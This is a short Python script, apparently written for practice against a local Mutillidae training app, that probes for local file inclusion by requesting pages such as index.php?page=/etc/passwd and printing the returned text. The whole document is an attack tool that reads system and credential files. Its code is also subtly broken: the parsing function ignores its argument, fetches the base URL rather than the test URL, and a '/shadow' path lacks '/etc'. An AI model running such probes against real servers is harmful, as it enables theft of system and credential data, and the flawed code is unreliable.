import requests
from bs4 import BeautifulSoup
def request(url):
    try:
        return requests.get("http://" + url)
    except requests.exceptions.ConnectionError:
        pass

def get_text_from_webpage(url):
    # Send a GET request to the URL

    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(response.content, 'html.parser')
    blockquote = soup.find('blockquote')
    content = blockquote.get_text(strip=True)
    return content


print("\n\nThis tool search and execute Local files in the server! \n")
target_url = "192.168.6.131/mutillidae/"
List = ["index.php?page=/etc/passwd", "index.php?page=/etc/hosts",  "index.php?page=/shadow"]
for Link in List:
    test_url = target_url + Link
    response = request(test_url)
    if response.status_code == 200:
        print("\n","---"*20)
        print("\n\n" + test_url + "\n\n")
        Page = get_text_from_webpage(request(target_url))
        print("\n\n" + Page + "\n\n")
request(target_url)